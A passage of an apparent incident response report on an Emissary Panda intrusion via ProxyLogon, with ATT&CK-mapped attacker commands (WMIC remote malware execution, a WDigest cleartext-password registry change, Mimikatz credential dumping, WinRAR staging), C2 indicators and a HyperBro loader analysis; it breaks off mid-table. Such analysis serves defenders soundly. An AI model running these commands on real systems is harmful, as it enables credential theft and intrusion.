actions in other attack campaigns using the same\nC2 infrastructure. Since the first activity in this phase was on 18.10.2021, and our IR Kick-off was in the\nfollowing week, it is unlikely that we tipped them of at this point in the attack. The last phase of their attack\nlasted from 18.10.2021 to the forced end of the attack on 09.11.2021.\n\nThe first reaction was the change of a DNS A record of one of their C2 domains to the IP address 127.0.0.1,\nwhich was done before the first response actions of this incident had been performed. Furthermore, they\nstrengthened their foothold in the network by more lateral movement and compromising more critical\nsystems, which is described in Section 6.9.\n\nTheir last uprising was observed on 09.11.2022. First, they started with reconnaissance by pulling a task list\nof the File server from the compromised Intranet server (Section 6.8.2). Next, they prepared for data\ncollection by creating “Rar.exe” (WinRar) remotely on the fileserver. It is unclear why Emissary Panda started\ntesting user credentials after the creation of WinRar, since they were already using a working Domain\nAdmin and the collection of data was running as well. Moreover, the operator of Emissary Panda mixed\nup the order of username and password, which explains why the credentials did not work. Due to the mixup, the operators probably thought that their stolen credentials have been revoked. Hence, in the following\nthey tried to steal new credentials by executing Mimikatz and exporting the registry. This chaos in\noperations leads us to the conclusion that different phases of the attack are executed by teams with\ndifferent capabilities. The initial compromise, privilege escalation, lateral movement and data exfiltration is\nprobably performed by higher-skilled teams, while later phases of the attack such as maintaining\npersistence are executed by less skilled teams. The mix-up is described in more technical detail in\nSection 6.8.1.\n\nMeanwhile the IR team had detected the activity and taken first measures to stop the data exfiltration.\nWhile the Internet cut-off was being prepared, responders started to disrupt the attackers. In order to stop\nthe collection process, WinRar processes were terminated remotely, and the tools used by the attackers\nwere manipulated and therefore “disarmed”. Of course, this was not a permanent solution, but it bought\nresponders and the management more time to prepare the Internet cut-off. As soon as the attackers\nrealized that the process was stopped and they couldn’t launch it again, they moved to the next\ncompromised system and started the collection process from there. Shortly after the last observed activity\nthe attack was stopped by cutting off internet access. This was maintained for two weeks until all\nremediation measures were implemented.\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\n# 6 Description of Observed TTPs\n\nThe following figure maps the observed Techniques, Tactics, and Procedures (TTPs), observed during the\nEmissary Panda attack to the TTPs listed by MITRE ATT&CK[21]:\n\n\n**Defense**\n\n**Evasion**\n\n\n**Credential**\n\n**Access**\n\n\n**Resource**\n**Development**\n\n\n**Initial**\n**Access**\n\n\n**Execution**\n\n\n**Lateral**\n**Movement**\n\n\n**Persistence**\n\n\n**Privilege**\n**Escalation**\n\n\n**Discovery**\n\n\n**Collection**\n\n\nT1047: Windows\n\nManagement\n\nInstrumentation\n\n\nT1003: OS\nCredential\nDumping\n\n|T1587: Dev elop Capabilities|Col2|\n|---|---|\n||T1587.001: Malware|\n\n|T1021: Remote Services|Col2|\n|---|---|\n||T1021.002: SMB/Windows Admin Shares|\n\n|Command and Control|Col2|\n|---|---|\n|T1071: Application Layer Protocol||\n||T1071.001: Web Protocols|\n\n|T1190: Exploit Public-Facing Application|Col2|\n|---|---|\n|T1078: Valid Accounts||\n||T1078.002: Domain Accounts|\n||T1078.003: Local Accounts|\n\n|T1560: Archive Collected Data|Col2|\n|---|---|\n||T1560.001: Archiv e v ia Utility|\n|T1119: Automated Collection||\n|T1074: Data Staged||\n\n|T1543: Create or Modif y Sy stem Process|Col2|\n|---|---|\n||T1543.003: Windows Serv ice|\n|T1574: Hijack Execution Flow||\n||T1574.001: DLL Search Order Hijacking|\n||T1574.002: DLL Side-Loading|\n|T1078: Valid Accounts||\n||T1078.002: Domain Accounts|\n||T1078.003: Local Accounts|\n\n|T1543: Create or Modif y Sy stem Process|Col2|\n|---|---|\n||T1543.003: Windows Serv ice|\n|T1574: Hijack Execution Flow||\n||T1574.001: DLL Search Order Hijacking|\n||T1574.002: DLL Side-Loading|\n|T1055: Process Injection||\n||T1055.012: Process Hollowing|\n|T1078: Valid Accounts||\n||T1078.002: Domain Accounts|\n||T1078.003: Local Accounts|\n\n|T1574: Hijack Execution Flow|Col2|\n|---|---|\n||T1574.001: DLL Search Order Hijacking|\n||T1574.002: DLL Side-Loading|\n|T1036: Masquerading||\n||T1036.004: Masquerade Task or Serv ice|\n||T1036.005: Match Legitimate Name or Location|\n|T1112: Modify Registry||\n|T1055: Process Injection||\n||T1055.012: Process Hollowing|\n|T1078: Valid Accounts||\n||T1078.002: Domain Accounts|\n||T1078.003: Local Accounts|\n\n\nFigure 6: Observed TTPs for Emissary Panda mapped to MITRE ATT&CK\n\nThe following subsections explain the observations for each technique and helps to understand the attack\nin detail.\n\n21 [https://attack.mitre.org/](https://attack.mitre.org/)\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\n## 6.1 Resource Development \n\n6.1.1 Develop Capabilities: Malware (T1587.001)\n\nThe attack heavily relied on the use of the HyperBro Remote Access Tool (RAT). According to our\nknowledge as well as several sources on the Internet[22] [23], this malware is only used by Emissary Panda.\nHence, HyperBro is most likely developed by the threat actor itself. The backdoor relies on DLL Search\nOrder Hijacking and DLL Side-loading, as described in Section 6.4. Furthermore, commands sent by the\nattacker are executed in-memory and do not create secondary artifacts, which complicates the forensic\nanalysis. A detailed analysis of the malware is performed in Section Malware Analysis of HyperBro.\n\n## 6.2 Initial Access\n\n6.2.1 Exploit Public-Facing Application (T1190)\n\nThe initial access to the victim’s infrastructure was performed by exploiting the ProxyLogon vulnerability.\nThe vulnerability became apparent to the public when Microsoft published a blog post on 02.03.2021\nstating that a new critical Exchange vulnerability was being actively exploited by attackers[24]. The first\ncommunication of the victim’s Exchange servers with the C2 IP addresses occurred on 04.03.2021.\nFurthermore, the Exchange servers were the first systems to communicate with the malicious IP addresses.\n\nAlthough, the initial system could not be forensically analyzed, the Firewall logs, the timing of Microsoft’s\npublication, and the first communication are sufficient to assume, that the initial access vector was in fact\nProxyLogon. This leads to the conclusion that Emissary Panda used the exploitation of the public-facing\nExchange server for their initial access.\n\n## 6.3 Execution\n\n6.3.1 Windows Management Instrumentation (T1047)\n\nEmissary Panda was observed to utilize the Windows Management Instrumentation (WMI) to execute\nmalware, scripts, commands, and collection tools.\n```\n$ wmic /node:<HOSTNAME> process call create \"cmd /c c:\\perflogs\\vfhost.exe\"\n$ wmic /node:<IP> process call create \"cmd /c c:\\perflogs\\vfhost.exe\"\n$ wmic /node:<IP> process call create \"cmd /c c:\\temp\\vfhost.exe\"\n$ wmic /node:<IP> process call create \"cmd /c d:\\$recycle.bin\\bin.bat\"\n$ wmic /node:<IP> process call create \" Rar.exe a d:\\<PATH>\\log \"E:\\<TARGET_DIR_1>\\\"\n\"E:\\<TARGET_DIR_2>\\\" \"H:\\<TARGET_DIR_3>\\*.xls*\" \"E:\\<TARGET_DIR_4>\\\" \"H:\\\n<TARGET_DIR_3>\\*.csv\" \"E:\\<TARGET_DIR_5>\\\" \"E:\\ <TARGET_DIR_6>\\\" d:\\Users\\Homes\\<USER>\\\n-r -y -hpC0yHvnGojFe9aqyM5VqT9ik4tkVnuKkPk8t -v5444M\"\n\n```\n22 [https://attack.mitre.org/software/S0398/](https://attack.mitre.org/software/S0398/)\n\n23 [https://malpedia.caad.fkie.fraunhofer.de/details/win.hyperbro](https://malpedia.caad.fkie.fraunhofer.de/details/win.hyperbro)\n\n24 [https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/](https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/)\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\nThe first three lines show the remote execution of the HyperBro malware on different systems using\ndifferent locations. In preparation to this remote execution, the corresponding malware files were dropped\nover an SMB connection authenticated by a legit domain admin. Following the placement of the malware,\nit is executed remotely with WMIC by referencing the remote system with its IP or hostname.\n\nThe fourth command shows the same technique for a malicious Batch script.\n\nLast, the collection tool was executed remotely with the same technique. The specified partitions\n(D:\\ and E:\\) are located on the target system. Hence, the collection tool was also placed on the target\nsystem beforehand. A detailed description of the command can be found in Section 6.10.\n\n## 6.4 Persistence\n\n6.4.1 Create or Modify System Process: Windows Service (T1543.003)\n\nThe threat actor has utilized Windows Services to achieve persistence of their HyperBro backdoor. The\nWindows service has the following settings:\n```\n Name   = windefenders\n Display  = Windows Defenders\n ImagePath = \"C:\\Program Files (x86)\\Common Files\\windefenders\\msmpeng.exe\"\n Type   = 0x0\n Start   = Auto Start\n Group   =\n\n```\nThe path of the service points to the malware, which was dropped at this location beforehand.\nFurthermore, the service is set to Auto Start to ensure persistence. Prior to creating this service, the\nthreat actor created a similar service with the name windefende-921919155 but deleted it within a few\nseconds. This behavior was observed multiple times with variations in numbers. Hence, the service names\n```\nwindefende-[0-9]{9} could also serve as IOCs. \n\n```\n6.4.2 Boot or Logon Autostart Execution: Registry Run Keys (T1547.001)\n\nAnother observed way of persistence was the utilization of a Registry run key for the current user. The key\nbeing used for persistence had the following name:\n```\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\windefenders\n\n```\nThis is a backup mechanism for the establishment of persistence, if the compromise account does not have\nenough privileges for the creation of a Windows Service\n\n6.4.3 Valid Accounts: Domain Accounts (T1078.002) and Local Accounts (T1078.003)\n\nDuring the attack, valid accounts were used for Persistence, Lateral Movement, Defense Evasion, Execution\nas well as Collection. Hence, there is no optimal sub-section for the placement of this technique. The\naccounts included both local accounts, such as the built-in administrator, as well as domain accounts,\nwhich were mainly domain administrators.\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\n## 6.5 Privilege Escalation\n\nSince the initial access with the exploitation of ProxyLogon (Section 6.2) provided the attacker already with\nsystem-level access to an Exchange server, and dumping of credentials (Section 6.7.1) provided a local\nadministrator account and a domain admin account (Section 6.4.3), which could be used for lateral\nmovement, there was no need for escalating privileges.\n\n## 6.6 Defense Evasion\n\n6.6.1 Hijack Execution Flow: DLL Search Order Hijacking (T1574.001) and DLL Side-Loading (T1574.002)\n\nAs described in multiple reports[25] [26], Emissary Panda often drops a legit application, which then side-loads\na malicious DLL. Since Windows first searches for the DLL in the same directory as the application is\nlaunched[27], the malicious DLL is loaded even if the original DLL exists on the target system. Hence, the DLL\nsearch order is hijacked by placing the files in the same directory. The following two files are placed in the\nsame directory to perform DLL Search Order Hijacking (T1574.001) and DLL Side-Loading:\n\n   - `msmpeng.exe` Renamed, but legit application signed by CyberArk[28]\n\n   - `vftrace.dll` Malicious DLL containing backdoor\n\nAfter placing the files in one directory, the msmpeng.exe is executed, which then loads the vftrace.dll.\nHence, the malicious code of the DLL is running in the context of a legit application.\n\n6.6.2 Modify Registry (T1112)\n\nThe configuration of the malware is stored in the Windows Registry. Therefore, the Registry key\n```\nHKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\config_ is used. The following values are stored under\n\n```\nthis key:\n```\n.msmpeng.exe.vftrace.dll thumb.dat1C:\\Program Files (x86)\\Common\nFiles\\windefenders\\.<company_name>.0101.windefenders.windefenders.Windows\nDefenders.Windows Defenders\nService..87.98.190.184»..fonts.dataanalyticsclub.com».\n87.98.190.184».\n\n```\nThe configuration information includes, the filenames, the service name used for persistence, and C2 IPs\nas well as C2 domains.\n\n25 [https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/](https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/)\n\n26 [https://www.welivesecurity.com/2020/12/10/luckymouse-ta428-compromise-able-desktop/](https://www.welivesecurity.com/2020/12/10/luckymouse-ta428-compromise-able-desktop/)\n\n27 [https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)\n\n[28https://www.virustotal.com/gui/file/df847abbfac55fb23715cde02ab52cbe59f14076f9e4bd15edbe28dcecb2a348/de](https://www.virustotal.com/gui/file/df847abbfac55fb23715cde02ab52cbe59f14076f9e4bd15edbe28dcecb2a348/details)\n[tails](https://www.virustotal.com/gui/file/df847abbfac55fb23715cde02ab52cbe59f14076f9e4bd15edbe28dcecb2a348/details)\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\nBesides storing their C2 configuration in the registry, Emissary Panda modified an existing registry key. Due\nto modifying the following registry key, they activated the storage of clear text passwords after logon in\nWDigest:\n```\nReg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\\n/v UseLogonCredential /t REG_DWORD /d 1\n\n```\nThis forces logon credentials to be stored in clear text, which can then be dumped by tools like Mimikatz,\nas described in Section 6.7.1.\n\n6.6.3 Process Injection: Process Hollowing (1055.012)\n\nSince most of the manually executed commands, such as reconnaissance, were executed in the context of\nthe legit process wermgr.exe, it is concluded that Emissary Panda performed process hollowing to avoid\ndetection by security tools. This thesis is supported by the fact, that the executable related to the process\nID is the legit wermgr.exe of Windows. Furthermore, the capability for process hollowing as well as the\ncorresponding strings within the malware were identified during our malware analysis of HyperBro, which\nis described in Section 8.3.\n\nThe following screenshot shows an excerpt of the EDR tool, which displays the reconnaissance activity in\nthe context of wermgr.exe:\n\nFigure 7: Process Hollowing used to execute malicious commands in the context of legit wermgr.exe\n\n6.6.4 Masquerading: Service (T1036.004), filename, and file location (T1036.005)\n\nOn several occasions, Emissary Panda tried to evade defenses by using names, which are associated with\nsecurity tools. This fact was also mentioned in previous reports[29]. In the referenced reports, Emissary Panda\nused a legitimate Symantec executable. In the case of this attack, Emissary Panda used an executable,\nwhich is signed by CyberArk and named as the Microsoft Defender. Furthermore, the executable was\nplaced in common paths for Microsoft Defender:\n\n- `C:\\Program Files (x86)\\Common Files\\windefenders\\msmpeng.exe`\n\n- `C:\\Program Files (x86)\\Common Files\\windefenders\\vftrace.dll`\n\n- `D:\\$recycle.bin\\`\n\nAs already mentioned in Section 6.4.1, the service used for persistence was also named after the Microsoft\nDefender.\n\nLast, the recycle bin was utilized to store the output-archives of the collection tool, as described in\nSection 6.10.1.\n\n29 [https://www.welivesecurity.com/2020/12/10/luckymouse-ta428-compromise-able-desktop/](https://www.welivesecurity.com/2020/12/10/luckymouse-ta428-compromise-able-desktop/)\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\n## 6.7 Credential Access\n\n6.7.1 OS Credential Dumping T1003\n\nIn order to gain valid credentials of accounts, Emissary Panda used techniques for credential dumping.\nThis also explains the extensive use of valid accounts, as described in Section 6.4.3. The following command\nwas observed during the attack:\n```\n$ msiexec.exe privilege::debug sekurlsa::logonPasswords\n\n```\nThe command line parameters equal the parameters of the credential dumping tool Mimikatz[30]. Since the\nprocess is running in a valid msiexec process, the attacker performed credential dumping in combination\nwith process hollowing, as described in Section 6.6.3.\n\n## 6.8 Discovery\n\n6.8.1 Account Discovery (T1087.001) and Permission Groups Discovery T1069\n\nTo gain more information about the Active Directory accounts and groups, Emissary Panda utilized the\nclassic Windows net tool.\n```\n$ net user <USER> /domain\n$ net1 user <ADMIN> /domain\n$ net group \"domain admins\" /domain\n$ net view \\\\<IP>\n$ net use \\\\<IP>\\ipc$ <PASSWORD> **********\n\n```\nApparently, the operator of Emissary Panda mixed up the order of username and password in the net use\ncommand. Hence, the password could be seen in clear-text and the username was redacted by the EDR.\n\n6.8.2 Process Discovery T1057\n\nEmissary Panda used the _Tasklist utility to remotely gather information about running processes on_\nsystems. The following command shows a remote execution of Tasklist, which stores the outputs to a file\nlocated in the Recycle Bin:\n```\n$ wmic /node:<IP> process call create \"cmd /c tasklist >d:\\$recycle.bin\\task.dat\"\n\n```\n6.8.3 System Information Discovery (T1082)\n\nAs a preparation for the data collection, Emissary Panda checked the used disk space of their target\ndirectories. The following command shows how they gained the used disk space for a home directory of\na User, located on the fileserver:\n```\n$ diruse /m /* \\\\<IP>\\d$\\Users\\Homes\\<USER>\n\n```\nThe command outputs the used disk space in Megabyte.\n\n30 [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\n## 6.9 Lateral Movement\n\n6.9.1 Remote Services: SMB Shares (T1021.002)\n\nThe threat actor utilized SMB shares to drop malware on remote systems. Following, the execution of the\nmalware was performed as described in Section 6.3.1. In order to access SMB shares on remote systems,\nEmissary Panda used valid accounts as described in Section 6.4.3.\n\n## 6.10 Collection\n\n6.10.1 Archive via Utility (T1560.001) and Automated Collection (T1119)\n\nBased on the observed hashes and parameters, Emissary Panda was using _Winrar to collect data in_\narchives. The following commands show data collection performed on the fileserver:\n```\n$ Rar.exe a d:\\<PATH>\\log \"E:\\<TARGET_DIR_1>\\\" \"E:\\<TARGET_DIR_2>\\\" \"H:\\\n<TARGET_DIR_3>\\*.xls*\" \"E:\\<TARGET_DIR_4>\\\" \"H:\\<TARGET_DIR_3>\\*.csv\" \"E:\\\n<TARGET_DIR_5>\\\" \"E:\\<TARGET_DIR_6>\\\" d:\\Users\\Homes\\<USER>\\ -r -y hpC0yHvnGojFe9aqyM5VqT9ik4tkVnuKkPk8t -v5444M \n$ Rar.exe a \\\\<IP_1>\\d$\\$recycle.bin\\bin.rar \"\\\\<IP_2>\\E$\\<TARGET_DIR_1>\\\"\n\"\\\\<IP_2>\\E$\\<TARGET_DIR_2>\\\" \"\\\\<IP_2>\\h$\\<TARGET_DIR_3>\\*.xls*\"\n\"\\\\<IP_2>\\E$\\<TARGET_DIR_4>\\\" \"\\\\<IP_2>\\h$\\<TARGET_DIR_3>\\*.csv\"\n\"\\\\<IP_2>\\E$\\<TARGET_DIR_5>\\\" \\\\<IP_2>\\d$\\Users\\Homes\\<USER>\\ -r -y -inul hpC0yHvnGojFe9aqyM5VqT9ik4tkVnuKkPk8t -v5767M\n\n```\nThe first command was launched remotely via WMIC on the fileserver. The collected files as well as the\noutput archive is located on the fileserver. The second command writes its output not to the fileserver but\nto another compromised system in the recycle bin. Both commands use the same password to encrypt\nthe archives (incl. file and directory names). Finally, both commands use different sizes for their partial\narchives, but the target directories are the same.\n\n6.10.2 Data Staged (T1074)\n\nAs can be seen in the commands of the Section 6.10.1, the output of the collection is staged. This means\nthat the first command creates partial archives of 5444 MB and the second command of 5767 MB. The\npartial archives are exfiltrated directly after creation and deleted afterwards.\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\n## 6.11 Command and Control\n\n6.11.1 Application Layer Protocol: Web Protocols T1071.001\n\nThe C2 communication was performed over HTTPS, which could be observed in the firewall logs. Since\nthe content was encrypted no statement regarding the content can be made. Nevertheless, the backdoor\non all compromised systems was sending beacons to the C2 IP addresses in regular intervals.\n\nVia memory analysis of a compromised systems the following post request with User Agent could be\nextracted:\n```\nPOST /api/v2/ajax HTTP/1.1\nConnection: Keep-Alive\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like\nGecko) Chrome/34.0.1847.116 Safari/537.36\nContent-Length: 87\nHost: 87.98.190.184\n\n```\nThe IP address 87.98.190.184 is one of the C2 IP addresses used by Emissary Panda.\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\n# 7 OSINT analysis of C2 infrastructure\n\nObserved C2 communication as well as HyperBro artifacts were analyzed and researched for additional\nindicators and common attributes.\n\nIn the analyzed samples, HyperBro uses a HTTPS protocol endpoint under the following path:\n```\n/api/v2/ajax. This is a unique web application path, which is very well suited for detecting HyperBro\n\n```\ntraffic. No legitimate applications or web installations have been identified that access this endpoint.\n\nFurthermore, we noted that multiple Emissary Panda C2 addresses share the identical Jarm hash\n```\n3fd3fd16d3fd3fd22c3fd3fd3fd3fdf20014c17cd0943e6d9e2fb9cd59862b as well as a specific\n\n```\n*.cybo-cloud.com certificate:\n```\nSubject CN=*.cybo-cloud.com\nIssuer  C=US, O=DigiCert Inc, OU=www.digicert.com, CN=RapidSSL RSA CA 2018\nSerial  Decimal: 3163476740895991561136217391472201532\n      Hex: 0x261437201eb9a171027589b0d724f3c\nValidity 2018-01-22 00:00:00 to 2021-04-21 12:00:00 (1185 days, 12:00:00)\nNames  *.cybo-cloud.com\n      cybo-cloud.com\nSHA-256 84e285d08381eb40ca1c218e51a3f9efe4d7ccd95c53e4a6bec9fa5e858a50d7\nSHA-1  44b9d089cf734d2478165a8539b23aed51887f7d\nMD5 210cbb1ed295fd13497a3e45a71a5240\n\n```\nWe were able to directly confirm seven C2 IP addresses with this specific Jarm hash and TLS certificate\ncombination. Passive DNS data suggests that also the following IP addresses might be related to Emissary\nPanda as these share the Jarm hash and TLS certificate as well. However, at the time of writing, this\nsuspicion was not confirmed.\n```\n104.168.143.39\n104.168.211.246\n138.124.180.56\n152.228.248.233\n154.38.118.188\n194.156.98.129\n45.76.208.198\n45.77.32.139\n47.75.189.54\n8.210.39.213\n\n```\nIn addition, it was observed that Emissary Panda reacted to incident response activities via resolving their\nC2 domain dataanalyticsclub.com to the localhost IP address 127.0.0.1. Thereby, effectively hiding\ntheir C2 traffic. Hence, active HyperBro backdoors on webservers might be identified by reviewing the local\naccess log for requests to the following path: /api/v2/ajax.\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\n# 8 Malware Analysis of HyperBro\n\nAs described in other public reports[31], HyperBro is a custom malware of Emissary Panda used as RAT. An\nanalysis[32] of the HyperBro version used in this attack campaign was recently published by the German\ndomestic intelligence services (Bundesamt für Verfassungsschutz, BfV). In addition to this publication, we\nprovide additional technical details about the inner workings and capabilities of the malware. Furthermore,\nwe created and published a tool, which is able to extract the configuration from the malware. This enables\nanalysts to quickly retrieve the IOCs from HyperBro samples. Finally, this chapter also summarizes the\ncapabilities and available C2 commands of HyperBro.\n\n## 8.1 Overview\n\nThe HyperBro malware consists of the following components:\n\nComponent Description\n\n`msmpeng.exe / vfhost.exe` Legit application signed by CyberArk[33], used for DLL Side-Loading\n\n`vftrace.dll (Stage 1)` Malicious DLL containing Stage 1 / the first loader\n\n`thumb.dat (Stage 2)` The file is encrypted with a weak one-byte key. After decryption, it\ncontains a loader for the PE Executable, which is also contained as\ncompressed buffer within the thumb.dat\n\n`PE Executable (Stage 3)` Contains the actual HyperBro backdoor written in C++\n\n`config.ini` Created after the first execution and contains a randomly generated\nGUID\n\nTo launch HyperBro, the legit CyberArk application msmpeng.exe / vfhost.exe is executed. Due to\nDLL Search Order Hijacking and DLL Side-Loading, as described in Section 6.6.1, this application loads the\nmalicious vftrace.dll. We refer to vftrace.dll as Stage 1 of the malware. The malicious DLL then\nopens and reads thumb.dat, which we refer to as Stage 2. This file is encrypted with a weak one-byte\nkey. It contains a loader and a compressed PE Executable. The loader decompresses the PE Executable\nwithin the thumb.dat and prepares it for execution. The decompressed PE Executable then contains the\nactual HyperBro backdoor, which we refer to as Stage 3. The exact process of decryption, decompression,\nand loading is explained in more detail in the following sections.\n\nThe complete process is depicted in Figure 8.\n\n31 [https://www.welivesecurity.com/2020/12/10/luckymouse-ta428-compromise-able-desktop/](https://www.welivesecurity.com/2020/12/10/luckymouse-ta428-compromise-able-desktop/)\n\n32 [https://www.verfassungsschutz.de/SharedDocs/kurzmeldungen/DE/2022/2022-01-26-cyberbrief.html](https://www.verfassungsschutz.de/SharedDocs/kurzmeldungen/DE/2022/2022-01-26-cyberbrief.html)\n\n[33https://www.virustotal.com/gui/file/df847abbfac55fb23715cde02ab52cbe59f14076f9e4bd15edbe28dcecb2a348/de](https://www.virustotal.com/gui/file/df847abbfac55fb23715cde02ab52cbe59f14076f9e4bd15edbe28dcecb2a348/details)\n[tails](https://www.virustotal.com/gui/file/df847abbfac55fb23715cde02ab52cbe59f14076f9e4bd15edbe28dcecb2a348/details)\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\n## 8.2 PE Loader\n\nAs displayed in Figure 8, the first stage opens and decrypts the `thumb.dat file. Figure 9 shows a`\nscreenshot of the decryption routine (first red box) and the launch of the decrypted PE Loader. The\ndecryption routine simply adds the byte 0xfc to each byte of the thumb.dat file. This is a rather simple\nencryption with a one-byte key, which can easily be reproduced.\n\nFigure 8: Malware Flow\n\nThe decrypted thumb.dat file contains the second stage, which is referenced to as the PE Loader, as well\nas a compressed PE file. The used compression method for Stage 3 is LZNT1[34].\n\nSince the vftrace.dll simply jumps to the beginning of the PE Loader, no functions are loaded or linked.\nEffectively, the program is started with no linked or imported functions. Hence, the PE Loader needs to\ninitialize itself.\n\n34 [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-xca/94164d22-2928-4417-876e-d193766c4db6](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-xca/94164d22-2928-4417-876e-d193766c4db6)\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\nFigure 9: Decryption of thumb.dat and launch of PE Loader\n\nA rather special method was chosen for this initialization. The loader contains a set of pairs of library and\nfunction names (both hashed with a custom hash function). To resolve the function, the Thread Information\nBlock (TIB) of the current process is loaded. Afterwards the Process Environment Block (PEB) is accessed,\nand the loaded modules are iterated to find the searched library. Following, the export table of the library\nis parsed to find the function.\n\nFigure 10: Structure with function pointers after resolving procedure via hashing\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\nAs stated before, the library and function names are stored in a hashed form. The utilized hash function\nwas only seen in one other public report from Palo Altos’ Unit 42 published in 2017. The result of the\nfunction resolution via the hashing algorithm is a structure containing several functions pointer, as can be\nseen in Figure 10.\n\nFigure 11: Parameters of decompress buffer functions of PE Loader\n\nNext, the loader invokes a function that is used for decompressing the PE file contained in the decrypted\nthumb.dat. The parameters of the function can be seen in Figure 11, while the function itself is display in\nFigure 12.\n\nFigure 12: Decompress buffer function of PE Loader\n\nAfter successful execution the decompress_buffer function, another function parses the decompressed\nbuffer, which is the third stage (PE Executable), loads its sections into memory, sets up the correct\npermissions on its memory pages, and finally launches the third stage. An excerpt of the launch_payload\nfunction can be seen in Figure 13.\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\nFigure 13: Stage 3 launcher\n\nSince the PE loader has effectively no import table, but only a structure of function pointers, it is less likely\nto be detected by Antivirus products. The products often look for suspicious library functions, which are\nloaded by a program, for example WinHttp. The result of the PE loader is a loaded and launched third\nstage.\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\n## 8.3 Capabilities\n\nThe actual backdoor (Stage 3) shows sophisticated capabilities regarding remote access and command\nand control, as well as persistence and evasion.\n\nThe following classes were found during the analysis, which provide a first indication of the functionality of\nthe malware.\n\n\n\n- `TCaptureData`\n\n- `TCaptureMgr`\n\n- `TClipboardInfo`\n\n- `TClipboardMgr`\n\n- `Tcommdand`\n\n- `TConfig`\n\n- `TDirve (not a typo)`\n\n- `TFileData`\n\n- `TFileDataReq`\n\n- `TFileDown`\n\n- `TSock`\n\n- `TUserMgr`\n\n\n\n- `TFileInfo`\n\n- `TFileMgr`\n\n- `TFileRename`\n\n- `TFileRetime`\n\n- `TFileUpload`\n\n- `TKeyboardMgr`\n\n- `TKeyboarrdInfo`\n\n- `TLogin`\n\n- `TLoop`\n\n- `TPacket`\n\n- `TTransConnect`\n\n- `TTransData`\n\n\n\n- `TProcessInfo`\n\n- `TprocessMgr`\n\n- `TRegeditKeyinfo`\n\n- `TRegeditMgr`\n\n- `TRegeditValueInfo`\n\n- `TServiceInfo`\n\n- `TServiceMgr`\n\n- `TShellcodeData`\n\n- `TshellCodeMgr`\n\n- `TShellMgr`\n\n\nFurthermore, the malware has the capability to gain persistence in multiple ways on the target system.\nOne way is the creation of a Windows Service, as described in Section 3.4.1. Another way is the creation of\na Run Key within the Windows Registry, as described in Section 6.4.2.\n\nStage 3 is a sophisticated backdoor with various capabilities. It is controlled from a C2 server, which\nprovides commands to the backdoor by responding to HTTPS requests originating from the backdoor.\nThe first byte of the HTTPS response contains a byte specifying the command for the backdoor. Based on\nthe command the backdoor executes one of eight operations. The table in this subsection describes the\noperations of Stage 3.\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\n|Command code|Description|\n|---|---|\n|0x0|No operation / Wait for commands|\n|0x10|Initial Logon to C2 server. Register new backdoor at C2 server|\n|0x15|Delete everything □ Deletes the file: <path>\\windefenders\\config.ini □ Deletes the file: <path>\\windefenders\\log.log □ Deletes the file: <path>\\windefenders\\msmpeng.exe □ Deletes the file: <path>\\windefenders\\vftrace.dll □ Deletes the file: <path>\\windefenders\\thumb.dat □ Deletes the directory: <path>\\windefenders □ Deletes the registry key: HKLM\\SOFTWARE\\Microsoft\\config_ Note that the paths/files depend on the current configuration of the malware|\n|0x17|Get information about the infected system: □ Get logged on user and check privileges of the user □ Send information to C2|\n|0x18|Perform Process Hollowing: □ Restarts the backdoor in a hollowed process □ The following legit target processes are utilized: □ svchost.exe -k networkservice □ svchost.exe -k localservice □ Stop the current instance of the backdoor if hollowing was successful|\n|0x1B|Opens a remote shell and executes received commands: □ Sleep time of the while loop in the backdoor is decreased from 1000 ms to 100 ms for more responsive behavior of the remote shell □ Creates a new thread, which pulls commands from C2 server, which are then executed 